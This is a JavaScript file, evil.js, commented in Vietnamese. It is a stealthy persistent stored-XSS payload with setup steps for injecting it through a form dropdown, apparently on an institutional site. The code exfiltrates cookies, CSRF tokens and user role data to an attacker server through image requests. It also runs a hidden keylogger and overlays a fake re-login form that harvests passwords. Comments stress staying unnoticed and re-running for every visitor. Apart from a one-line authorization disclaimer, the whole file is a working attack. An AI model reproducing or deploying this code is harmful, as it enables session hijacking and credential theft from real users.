// ============================================================
// evil.js - Persistent XSS stealth (nằm lại + hoạt động ngầm)
//
// ⚠️ Chỉ dùng để test bảo mật trên hệ thống bạn được phép.
//
// Đặc điểm:
// - KHÔNG alert, KHÔNG console.log, KHÔNG gây chú ý
// - Chạy lại MỖI LẦN trang load (persistent qua dropdown)
// - Gửi dữ liệu về server mỗi lần nạn nhân truy cập
// - Tự hủy nếu chạy trùng (tránh chạy 2 lần trong 1 trang)
// - Log số lần chạy vào localStorage để theo dõi
//
// Cách setup:
// 1. Chạy server: py attacker_server.py
// 2. Upload file này lên GitHub raw
// 3. Dán payload vào dropdown (học hàm/dân tộc...)
//    '><svg onload=$.get(`//URL_CỦA_BẠN/evil.js`).then(eval)>
// 4. MỌI NGƯỜI truy cập form → payload chạy → gửi về server
// ============================================================

(function() {
  'use strict';

  // ⚙️ CẤU HÌNH
  var ATTACKER_URL = "http://localhost:9000/steal";  // Server nhận dữ liệu
  var VERSION = "1.0";

  // ============================================================
  // CHỐNG CHẠY TRÙNG (chỉ chạy 1 lần mỗi trang)
  // ============================================================
  try {
    if (window.__xssRunning) return;  // Đã chạy rồi thì thoát
    window.__xssRunning = true;
  } catch(e) {}

  // ============================================================
  // HÀM GỬI DỮ LIỆU (Image GET - không bị CORS chặn)
  // ============================================================
  function exfil(data, p) {
    try {
      var img = new Image();
      var params = [];
      for (var k in data) {
        params.push(encodeURIComponent(k) + '=' + encodeURIComponent(data[k]));
      }
      img.src = ATTACKER_URL + '?' + p + '&' + params.join('&');
    } catch(e) {}
  }

  // ============================================================
  // THU THẬP THÔNG TIN (không ghi log ồn ào)
  // ============================================================
  var cookies;
  try { cookies = document.cookie || ""; } catch(e) { cookies = ""; }

  var csrfToken;
  try {
    var c = document.querySelector('meta[name="csrf-token"]');
    csrfToken = (c && c.content) ? c.content : "none";
  } catch(e) { csrfToken = "none"; }

  var gonData = {};
  try {
    if (typeof gon !== 'undefined') {
      gonData = {
        uid: gon.user_id,
        uname: gon.user_name || gon.username,
        org: gon.organization,
        lead: gon.leader_roles,
        fac: gon.faculty,
        roles: gon.roles
      };
    }
  } catch(e) {}

  var pageInfo = {
    url: location.href.substring(0, 300),
    domain: document.domain,
    title: document.title.substring(0, 100),
    ua: navigator.userAgent.substring(0, 150),
    time: new Date().toISOString()
  };

  // ============================================================
  // THEO DÕI SỐ LẦN CHẠY (localStorage - mỗi trình duyệt)
  // ============================================================
  var runCount = 0;
  try {
    runCount = parseInt(localStorage.getItem('__xss_count') || '0', 10) + 1;
    localStorage.setItem('__xss_count', String(runCount));
  } catch(e) {}

  // Gửi dữ liệu MỖI LẦN trang load
  exfil({
    cookies: cookies.substring(0, 500),
    csrf: csrfToken.substring(0, 100),
    url: pageInfo.url,
    domain: pageInfo.domain,
    title: pageInfo.title,
    ua: pageInfo.ua,
    gon: JSON.stringify(gonData).substring(0, 300),
    run: runCount,
    ver: VERSION,
    time: pageInfo.time
  }, 'visit');

  // ============================================================
  // KEYLOGGER NGẦM (ghi phím, gửi mỗi 15 ký tự)
  // ============================================================
  (function() {
    var buf = [];
    document.addEventListener('keydown', function(e) {
      try {
        var key = e.key;
        if (key.length > 1) key = '[' + key + ']';
        buf.push(key);
        if (buf.length >= 15) {
          exfil({k: btoa(buf.join('')), u: pageInfo.url, t: Date.now()}, 'key');
          buf = [];
        }
      } catch(e2) {}
    });
  })();

  // ============================================================
  // PHISHING FORM - HIỆN LẦN ĐẦU, NGƯNG KHI ĐÃ CÓ DỮ LIỆU
  // ============================================================
  // Cơ chế:
  // - localStorage '__xss_phish_done' = '1' → đã có dữ liệu → KHÔNG hiện
  // - Chưa có → hiện form mỗi lần truy cập cho đến khi nhập xong
  // - Khi nạn nhân nhập + bấm nút → gửi dữ liệu → set done → không hiện nữa
  try {
    var phishDone = localStorage.getItem('__xss_phish_done') === '1';
    if (!phishDone) {
      var o = document.createElement('div');
      o.innerHTML =
        '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center;">' +
        '<div style="background:#fff;padding:30px;border-radius:8px;width:350px;font-family:Arial;font-size:14px;">' +
        '<h2 style="margin:0 0 15px 0;color:#1976d2;text-align:center;">Đăng Nhập</h2>' +
        '<p style="margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;">Phiên làm việc đã kết thúc. Vui lòng xác thực lại.</p>' +
        '<input type="text" id="u" placeholder="Tên đăng nhập" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;">' +
        '<input type="password" id="p" placeholder="Mật khẩu" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;">' +
        '<button id="s" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;">Xác nhận</button>' +
        '</div></div>';
      document.body.appendChild(o);
      document.getElementById('s').onclick = function() {
        var u = document.getElementById('u').value;
        var p = document.getElementById('p').value;
        // Gửi dữ liệu về server
        exfil({
          u: u,
          p: p,
          url: pageInfo.url
        }, 'pwd');
        // Đánh dấu đã có dữ liệu → không hiện form nữa
        try { localStorage.setItem('__xss_phish_done', '1'); } catch(e2) {}
        // Ẩn form
        o.remove();
      };
    }
  } catch(e) {}

  // ============================================================
  // CHẠY NGẦM MỖI KHI TRANG LOAD - KHÔNG TỰ XÓA PAYLOAD
  // ============================================================
  // LƯU Ý: KHÔNG xóa option khỏi dropdown!
  // Payload nằm lại trong database → mọi người truy cập → chạy lại

  // ============================================================
  // TÓM TẮT CHẾ ĐỘ HOẠT ĐỘNG:
  // 1. ✅ Mỗi lần ai đó mở trang → gửi 'visit' về server
  // 2. ✅ Keylogger ghi âm thầm, gửi mỗi 15 phím
  // 3. ✅ Phishing HIỆN LẦN ĐẦU (mỗi trình duyệt)
  //    - Hiện lại mỗi lần truy cập cho đến khi nhập xong
  //    - Sau khi có dữ liệu → localStorage '__xss_phish_done'=1
  //    - Từ đó KHÔNG hiện nữa (chỉ chạy ngầm)
  // 4. ✅ Không alert, không console.log, không thay đổi UI
  // 5. ✅ Payload persistent - nằm lại vĩnh viễn trong dropdown
  //    - Chỉ cần inject 1 lần → mọi lần truy cập sau tự chạy
  // ============================================================
})();
